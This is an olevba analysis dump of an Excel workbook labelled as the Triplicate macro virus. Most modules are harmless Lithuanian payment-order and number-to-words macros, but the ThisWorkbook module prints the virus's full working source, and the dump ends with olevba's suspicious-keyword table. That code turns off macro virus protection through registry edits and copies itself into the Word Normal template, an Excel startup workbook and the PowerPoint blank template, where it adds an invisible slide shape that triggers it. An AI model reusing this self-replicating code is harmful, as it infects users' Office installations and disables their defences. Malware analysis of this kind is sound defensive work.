olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Function Stot(n As Currency) As String
Attribute Stot.VB_ProcData.VB_Invoke_Func = " \n14"
Dim a(9) As String

Skaic = "0000000" + CStr(Int(n))
LSkaic = Len(Skaic)

a(1) = Mid(Skaic, LSkaic - 6, 1)
a(2) = Mid(Skaic, LSkaic - 5, 1)
a(3) = Mid(Skaic, LSkaic - 4, 1)
a(4) = Mid(Skaic, LSkaic - 3, 1)
a(5) = Mid(Skaic, LSkaic - 2, 1)
a(6) = Mid(Skaic, LSkaic - 1, 1)
a(7) = Mid(Skaic, LSkaic, 1)
a(8) = Mid(CStr(n - Int(n)), 3, 1)
a(9) = Mid(CStr(n - Int(n)), 4, 1)


If a(8) = "" Then
    a(8) = "0"
End If

If a(9) = "" Then
    a(9) = "0"
End If

For i = 1 To 7
   If a(i) = "0" Then
        a(i) = " "
    End If
Next
'
'Analizuojamas a(1) - milijonai
'
mv = ""
If a(1) <> " " Then
    Select Case a(1)
        Case "1"
            mv = " milijonas"
        Case Else
            mv = " milijonai"
    End Select
    a(1) = sk(a(1))
End If
'
'Analizuojami a(2), a(3) ir a(4)
'
ts = ""
tv = ""
If a(2) <> " " Then
    Select Case a(2)
        Case "1"
            ts = " šimtas"
        Case Else
            ts = " šimtai"
    End Select
    tv = " tūkstančių"
    a(2) = sk(a(2))
End If

If a(3) <> " " Then
    If a(3) = "1" And a(4) <> " " Then
        a(3) = sk(a(3) + a(4))
        a(4) = " "
    Else
        a(3) = sk(a(3) + "0")
    End If
    tv = " tūkstančių"
End If
   
If a(4) <> " " Then
    Select Case a(4)
        Case "1"
            tv = " tūkstantis"
        Case Else
            tv = " tūkstančiai"
    End Select
    a(4) = sk(a(4))
End If
'
'Analizuojami a(5), a(6) ir a(7)
'
s = ""
If a(5) <> " " Then
    Select Case a(5)
        Case "1"
            s = " šimtas"
        Case Else
            s = " šimtai"
    End Select
    a(5) = sk(a(5))
End If

If a(6) <> " " Then
    If a(6) = "1" And a(7) <> " " Then
        a(6) = sk(a(6) + a(7))
        a(7) = " "
    Else
        a(6) = sk(a(6) + "0")
    End If
End If

If a(7) <> " " Then
    a(7) = sk(a(7))
End If

For i = 1 To 7
    a(i) = Trim(a(i))
    If a(i) <> "" Then
        a(i) = " " + a(i)
    End If
Next

Litai = a(1) + mv + a(2) + ts + a(3) + a(4) + tv + a(5) + s + a(6) + a(7)
Litai = Trim(Litai)

If Litai = "" Then
    Litai = "nulis"
End If

Ss = Litai + " Lt " + a(8) + a(9) + " ct."
S1 = UCase(Mid(Ss, 1, 1))
S2 = Mid(Ss, 2)
Gs = S1 + S2

Stot = "Suma žodžiais:  " & Gs
End Function
'
'
Function sk(s As String)
Attribute sk.VB_ProcData.VB_Invoke_Func = " \n14"
'
'Skaičius paverčiamas žodžiu.
'
Select Case s
    Case "1"
        sk = "vienas"
    Case "2"
        sk = "du"
    Case "3"
        sk = "trys"
    Case "4"
        sk = "keturi"
    Case "5"
        sk = "penki"
    Case "6"
        sk = "šeši"
    Case "7"
        sk = "septyni"
    Case "8"
        sk = "aštuoni"
    Case "9"
        sk = "devyni"
    Case "10"
        sk = "dešimt"
    Case "11"
        sk = "vienuolika"
    Case "12"
        sk = "dvylika"
    Case "13"
        sk = "trylika"
    Case "14"
        sk = "keturiolika"
    Case "15"
        sk = "penkiolika"
    Case "16"
        sk = "šešiolika"
    Case "17"
        sk = "septyniolika"
    Case "18"
        sk = "aštuoniolika"
    Case "19"
        sk = "devyniolika"
    Case "20"
        sk = "dvidešimt"
    Case "30"
        sk = "trisdešimt"
    Case "40"
        sk = "keturiasdešimt"
    Case "50"
        sk = "penkiasdešimt"
    Case "60"
        sk = "šešiasdešimt"
    Case "70"
        sk = "septyniasdešimt"
    Case "80"
        sk = "aštuoniasdešimt"
    Case "90"
        sk = "devyniasdešimt"
    Case Else
        sk = "Tokio skaičiaus nėra!"
End Select
End Function


-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub mpf()
Attribute mpf.VB_ProcData.VB_Invoke_Func = " \n14"
'   Užpildoma mokėjimo pavedimo forma.
'   Duomenys - iš MP suvestinės.
    r = ActiveCell.Row
    enr = Cells(r, 1).Value         'Mokėjimo pavedimo eilės numeris
    m = mp(Cells(r, 2).Value)       'Mėnuo, kada buvo daromas pavedimas
    d = CStr(Cells(r, 3).Value)     'Diena, . . .
    d = "0" + d
    d = Mid(d, Len(d) - 1, 2)
    moketojas = Cells(r, 4).Value
    mbankas = Cells(r, 5).Value
    mbk = Cells(r, 6).Value
    mas = Cells(r, 7).Value
    gavejas = Cells(r, 8).Value
    gbk = Cells(r, 10).Value
    gbankas = Cells(r, 9).Value
    gas = Cells(r, 11).Value
    suma = Cells(r, 12).Value
    uzka = Cells(r, 13).Value
    
'   Baigiama pildyti mokėjimo pavedimo forma.
    Sheets("MP forma").Activate
    Range("F2").Value = enr
    Range("D4").Value = m
    Range("F4").Value = d
    Range("F43").Value = d
    Range("H8").Value = suma
    Range("G6").Value = mas
    Range("G11").Value = gas
    Range("F8").Value = mbk
    Range("F13").Value = gbk
    Range("B12").Value = gavejas
    Range("B7").Value = moketojas
    Range("A14").Value = "Gavėjo bankas: " & gbankas
    Range("A9").Value = "Mokėtojo bankas: " & mbankas

    ActiveSheet.DrawingObjects("Text 3").Select
    Selection.Characters.Text = uzka
    ActiveSheet.DrawingObjects("Text 6").Select
    Selection.Characters.Text = uzka
    Range("C24").Select
End Sub

Function mp(m As Integer) As String
Attribute mp.VB_ProcData.VB_Invoke_Func = " \n14"

'Funkcija mp skaičių pakeičia mėnesio pavadinimu.

Select Case m
    Case 1
        mp = "sausio"
    Case 2
        mp = "vasario"
    Case 3
        mp = "kovo"
    Case 4
        mp = "balandžio"
    Case 5
        mp = "gegužės"
    Case 6
        mp = "birželio"
    Case 7
        mp = "liepos"
    Case 8
        mp = "rugpjūčio"
    Case 9
        mp = "rugsėjo"
    Case 10
        mp = "spalio"
    Case 11
        mp = "lapkričio"
    Case 12
        mp = "gruodžio"
End Select

End Function



-------------------------------------------------------------------------------
VBA MACRO Module3.bas 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub mok()
Attribute mok.VB_ProcData.VB_Invoke_Func = " \n14"
'   Užpildomas MP suvestinės "Mokėtojo" stulpelis.
'
'   Randamas pirmas tuščias langelis stulpelyje "Mokėtojas"
    i = 1
    Do
        i = i + 1
    Loop Until IsEmpty(Cells(i, 4).Value)
    
'
'   Aktyvizuojamas pirmas OptionButton punktas
    DialogSheets(1).OptionButtons(1).Value = 1
    
    t = DialogSheets(1).Show    't = TRUE jei iš dialoginio lango bus išeinama OK
    
    i1 = DialogSheets(1).OptionButtons(1).Value 'i1 = 1 jei bus pasirinktas pirmas punktas
    i2 = DialogSheets(1).OptionButtons(2).Value 'i2 = 1 jei bus pasirinktas antras punktas
    
'   Pagal tai, kuris punktas dialoginiame lange buvo pasirinktas,
'   užpildoma paskutinis MP suvestinės "Mokėtojo" stulpelio langelis
    If t Then
        If i1 = 1 Then
            m = "UAB ""Vakarų Lietuvos pramonės ir finansų korporacija"""
        End If
        If i2 = 1 Then
            m = "Bendra Lietuvos ir Rusijos įmonė UAB ""Stella Vitae"""
        End If
        Cells(i, 4).Value = m
'   Pasirinktai firmai priskiriamas naujas Mok. pavedimo Numeris
        enr = 0
        For j = 2 To i
            If m = Cells(j, 4).Value Then
                enr = Application.Max(enr, Cells(j, 1).Value)
            End If
        Next j
        Cells(i, 1).Value = enr + 1

'   Užpildomos mėnesio ir dienos langeliai
        Cells(i, 2).Value = CInt(Month(Date))
        Cells(i, 3).Value = CInt(Day(Date))
        Cells(i, 3).Activate
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module4.bas 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub mbank()
Attribute mbank.VB_ProcData.VB_Invoke_Func = " \n14"
'   Randamas pirmas tuščias langelis stulpelyje "Mokėtojas"
    i = 1
    Do
        i = i + 1
    Loop Until IsEmpty(Cells(i, 5).Value)
'   Pagal tai, kas yra mokėtojas, aktyvizuojamas atitinkamas
'   dialoginis langas
    If Cells(i, 4).Value = "UAB ""Vakarų Lietuvos pramonės ir finansų korporacija""" Then
        DialogSheets(2).OptionButtons(3).Value = 1
        t = DialogSheets(2).Show
        i1 = DialogSheets(2).OptionButtons(1).Value 'i1 = 1 jei bus pasirinktas pirmas punktas
        i2 = DialogSheets(2).OptionButtons(2).Value 'i2 = 1 jei bus pasirinktas antras punktas
        i3 = DialogSheets(2).OptionButtons(3).Value 'i3 = 1 jei bus pasirinktas trečias punktas
        
        If t Then
            If i1 = 1 Then
                Cells(i, 5).Value = "Bankas ""Hermis"", Klaipėdos filialas"
                Cells(i, 6).Value = 260101760
                Cells(i, 7).Value = 5467915
            End If
            If i2 = 1 Then
                Cells(i, 5).Value = "Litimpeks bankas, Klaipėdos fil."
                Cells(i, 6).Value = 260101335
                Cells(i, 7).Value = 467246
            End If
            If i3 = 1 Then
                Cells(i, 5).Value = "LVKB Klaipėdos sk."
                Cells(i, 6).Value = 260101550
                Cells(i, 7).Value = 11467108
            End If
        End If
    End If
    
    If Cells(i, 4).Value = "Bendra Lietuvos ir Rusijos įmonė UAB ""Stella Vitae""" Then
        DialogSheets(3).OptionButtons(3).Value = 1
        t = DialogSheets(3).Show
        i1 = DialogSheets(3).OptionButtons(1).Value 'i1 = 1 jei bus pasirinktas pirmas punktas
        i2 = DialogSheets(3).OptionButtons(2).Value 'i2 = 1 jei bus pasirinktas antras punktas
        i3 = DialogSheets(3).OptionButtons(3).Value 'i2 = 1 jei bus pasirinktas antras punktas
        
        If t Then
            If i1 = 1 Then
                Cells(i, 5).Value = "Bankas ""Hermis"", Klaipėdos filialas"
                Cells(i, 6).Value = 260101760
                Cells(i, 7).Value = 5467711
            End If
            If i2 = 1 Then
                Cells(i, 5).Value = "Litimpeks bankas, Klaipėdos fil."
                Cells(i, 6).Value = 260101335
                Cells(i, 7).Value = 467835
            End If
            If i3 = 1 Then
                Cells(i, 5).Value = "LVKB Klaipėdos sk."
                Cells(i, 6).Value = 260101550
                Cells(i, 7).Value = 10467280
            End If
        End If
    End If
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Triplicate v0.21 /1nternal
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountofLines
        AD.InsertLines 1, TT.Lines(1, TT.CountofLines)
        If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
            AD.InsertLines 1, NT.Lines(1, NT.CountofLines)
        End If
    End If
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, AD.Lines(1, AD.CountofLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
        End If
        xlApp.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
    End If
    If TT.Lines(1, 1) <> "'<!--1nternal-->" Then
        TT.DeleteLines 1, TT.CountofLines
        TT.InsertLines 1, NT.Lines(1, NT.CountofLines)
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Book1Obj.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountofLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSOffice.Triplicate.c-f830ef753f1cdd87c67b5c20e7ebe9f366ab0643 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  MP form
' 0085     32 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - M P   s u v
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Banka
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - M o k 
' 0085     22 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - G a v 
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - S s k
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Mat. turta
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Module
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Module
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Module
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Module
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Dialog
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Dialog
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Dialog
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

